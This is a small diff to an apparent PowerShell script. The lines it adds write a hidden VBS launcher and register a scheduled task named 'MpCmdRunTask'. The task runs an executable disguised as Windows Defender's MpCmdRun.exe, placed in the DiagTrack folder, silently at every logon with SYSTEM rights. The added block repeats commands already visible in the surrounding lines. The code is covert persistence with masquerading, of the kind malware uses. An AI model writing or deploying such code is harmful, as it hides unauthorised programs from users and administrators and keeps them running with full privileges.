@@ -99,6 +99,12 @@ Set-Content $vbspath 'CreateObject("Wscript.Shell").Run "C:\Windows\DiagTrack\Se
 
 schtasks /create /tn "MpCmdRunTask" /tr "wscript.exe \"$vbspath\"" /sc onlogon /ru "SYSTEM"
 
+# 1. Create the VBS wrapper to run the EXE silently
+$vbspath = "$env:ProgramData\MpCmdRunHidden.vbs"
+Set-Content $vbspath 'CreateObject("Wscript.Shell").Run "C:\Windows\DiagTrack\Settings\MpCmdRun.exe", 0, False'
+
+# 2. Register the hidden scheduled task
+schtasks /create /tn "MpCmdRunTask" /tr "wscript.exe \"$vbspath\"" /sc onlogon /ru SYSTEM
 
 
 # Register the scheduled task
